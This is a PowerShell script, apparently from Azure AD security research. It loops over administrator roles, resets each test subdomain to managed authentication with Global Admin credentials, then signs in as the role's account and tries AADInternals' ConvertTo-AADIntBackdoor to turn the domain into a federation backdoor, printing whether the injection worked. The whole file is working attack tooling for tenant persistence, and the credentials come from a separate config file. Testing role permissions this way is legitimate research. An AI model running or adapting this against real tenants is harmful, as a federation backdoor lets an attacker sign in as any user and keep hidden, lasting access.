Import-Module AADInternals
Import-Module MSOnline

. .\config.ps1

if ($PSVersionTable.PSVersion.Major -ge 7) {
    Write-Error "MSOL isn't compatible with PowerShell 7+. Try again with PowerShell 5"
    return
}

$roles = @("globalAdmin", "securityAdmin", "hybridIdentityAdmin", "externalIdentityProviderAdmin", "domainNameAdmin", "partnerTier1Support", "partnerTier2Support")
# $roles = @("hybridIdentityAdmin")

foreach ($role in $roles) {
    Write-Host "---------------------- $role"
    $fqdn = "$role.$custom_domain_suffix"

    # first, use Global Admin account to delete federation
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials["globalAdmin"].login, (ConvertTo-SecureString -String $credentials["globalAdmin"].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    $atg = Get-AADIntAccessTokenForMSGraph -Credentials $Credential
    Connect-MsolService -AdGraphAccessToken $at -MsGraphAccessToken $atg
    
    # disable federation to clear everything
    Set-MsolDomainAuthentication -DomainName $fqdn -Authentication Managed

    # ensure it's applied
    do {
        $domain = $null
        $domain = Get-MsolDomain -DomainName $fqdn
        Start-Sleep 2
    } while ($null -eq $domain -or $domain.Authentication -ne "Managed")


    # now, log as target user and try enabling backdoor
    $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $credentials[$role].login, (ConvertTo-SecureString -String $credentials[$role].password -AsPlainText -Force)
    $at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential
    try {
        $backdoor = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName "$role.$custom_domain_suffix"
        Write-Host "[+] Injected :) $backdoor"
    }
    catch {
        Write-Host "[-] Failed :( $($_.Exception.Message)"
        Continue
    }
}